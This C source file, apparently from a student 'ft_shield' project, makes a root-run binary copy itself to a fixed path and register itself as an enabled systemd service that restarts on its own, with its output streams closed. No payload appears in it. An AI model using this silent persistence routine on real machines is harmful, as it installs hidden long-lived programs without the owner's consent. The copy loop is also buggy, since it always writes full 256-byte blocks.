#include "ft_shield.h"


void duplicate_file() {
	int sym_fd = open("/proc/self/exe", O_RDONLY);
	if (sym_fd < 0) {
		fprintf(stderr, "Failed to open /proc/self/exe\n");
		exit(1);
	}
	if (!access("/etc/systemd/system/ft_shield.service", F_OK)) {
		system("systemctl stop ft_shield");
	}
	else if (!access("/etc/init.d/ft_shield", F_OK)) {
		system("/etc/init.d/ft_shield stop");
	}

	int ft_shield_fd = open(BIN_PATH, O_CREAT | O_WRONLY | O_TRUNC, 0755);
	if (ft_shield_fd < 0) {
		close(sym_fd);
		fprintf(stderr, "Failed to open the bianary file of ft_shield\n");
		exit(1);
	}
	char buf[256];
	while(read(sym_fd, buf, 256) > 0) {
		write(ft_shield_fd, buf, 256);
	}
	close(sym_fd);
	close(ft_shield_fd);
}

void create_daemon() {
	int service_fd = open("/etc/systemd/system/ft_shield.service", O_CREAT | O_WRONLY | O_TRUNC, 0755);
	if (service_fd < 0) {
		fprintf(stderr, "Failed to open /etc/systemd/system/ft_shield.service, trying /etc/init.d/ft_shield ...\n");
		int sysv_fd = open("/etc/init.d/ft_shield", O_CREAT | O_WRONLY | O_TRUNC, 0755);
		if (sysv_fd < 0) {
			fprintf(stderr, "Failed to open /etc/init.d/ft_shield\n");
			exit(1);
		} else {
			///TODO: write ft_shield to init.d
			system("/etc/init.d/ft_shield restart");
			close(sysv_fd);
		}
	} else {
		write(service_fd, SYSTEMD_CONFIG, strlen(SYSTEMD_CONFIG));
		system("systemctl daemon-reload");
		system("systemctl enable ft_shield");
		system("systemctl restart ft_shield");
		close(service_fd);
	}
}

void daemonize() {
	pid_t pid = fork();
	if (pid < 0) {
		fprintf(stderr, "Failed to fork\n");
		exit(1);
	} else if (pid == 0) {
		close(0);
		close(1);
		close(2);

		duplicate_file();

		create_daemon();
	}
}

int main() {
	if (geteuid()) {
		fprintf(stderr, "Must be root!\n");
		return(1);
	}
	char sym_path[256];
	memset(sym_path, 0, sizeof(sym_path));
	if(readlink("/proc/self/exe", sym_path, 256) < 0) {
		fprintf(stderr, "Failed to readlink /proc/self/exe\n");
		return(1);
	}
	if (strcmp(sym_path, BIN_PATH)) {
		printf("ylabtaim\n");
		daemonize();
	} else {
		printf("Yooooooo\n");
	}

	return (0);
}